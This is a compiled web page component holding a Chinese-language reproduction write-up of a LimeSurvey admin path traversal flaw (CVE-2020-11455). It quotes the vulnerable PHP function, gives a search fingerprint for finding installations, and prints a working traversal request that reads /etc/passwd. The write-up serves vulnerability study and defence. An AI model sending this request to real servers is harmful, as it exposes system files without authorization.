import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as a,e as n}from"./app-58e4a7d6.js";const l={},d=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>LimeSurvey（前称PHPSurveyor）是LimeSurvey团队的一套开源的在线问卷调查程序，它支持调查程序开发、调查问卷发布以及数据收集等功能。 LimeSurvey 4.1.12 + 200324之前版本中的application/controllers/admin/LimeSurveyFileManager.php文件存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>LimeSurvey &lt; 4.1.12 + 200324
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;LimeSurvey&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241501186.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>出现漏洞的文件为 <code>application/controllers/admin/LimeSurveyFileManager.php</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241501266.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>public function downloadFiles() {
        App()-&gt;loadLibrary(&#39;admin.pclzip&#39;);
        
        $folder = basename(Yii::app()-&gt;request-&gt;getPost(&#39;folder&#39;, &#39;global&#39;));
        $files = Yii::app()-&gt;request-&gt;getPost(&#39;files&#39;);

        $tempdir = Yii::app()-&gt;getConfig(&#39;tempdir&#39;);
        $randomizedFileName = $folder.&#39;_&#39;.substr(md5(time()),3,13).&#39;.zip&#39;;
        $zipfile = $tempdir.DIRECTORY_SEPARATOR.$randomizedFileName;
        $arrayOfFiles = array_map( function($file){ return $file[&#39;path&#39;]; }, $files);
        $archive = new PclZip($zipfile);
        $checkFileCreate = $archive-&gt;create($arrayOfFiles, PCLZIP_OPT_REMOVE_ALL_PATH);
        $urlFormat = Yii::app()-&gt;getUrlManager()-&gt;getUrlFormat();
        $getFileLink = Yii::app()-&gt;createUrl(&#39;admin/filemanager/sa/getZipFile&#39;);
        if($urlFormat == &#39;path&#39;) {
            $getFileLink .= &#39;?path=&#39;.$zipfile;
        } else {
            $getFileLink .= &#39;&amp;path=&#39;.$zipfile;
        }

        $this-&gt;_printJsonResponse(
            [
                &#39;success&#39; =&gt; true,
                &#39;message&#39; =&gt; sprintf(gT(&quot;Files are ready for download in archive %s.&quot;), $randomizedFileName),
                &#39;downloadLink&#39; =&gt; $getFileLink ,
            ]
        );
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>路由为: <code>admin/filemanager/sa/getZipFile</code>, 这里传入参数 path 到方法 <code>getZipFile()</code>中</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241501030.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这里通过 readfile方法 读取文件，登录后台后发送请求</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/index.php/admin/filemanager/sa/getZipFile?path=/../../../../../../../etc/passwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241501923.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,17),r=[d];function t(s,c){return i(),a("div",null,r)}const o=e(l,[["render",t],["__file","LimeSurvey LimeSurveyFileManager.php 后台任意文件读取漏洞 CVE-2020-11455.html.vue"]]);export{o as default};
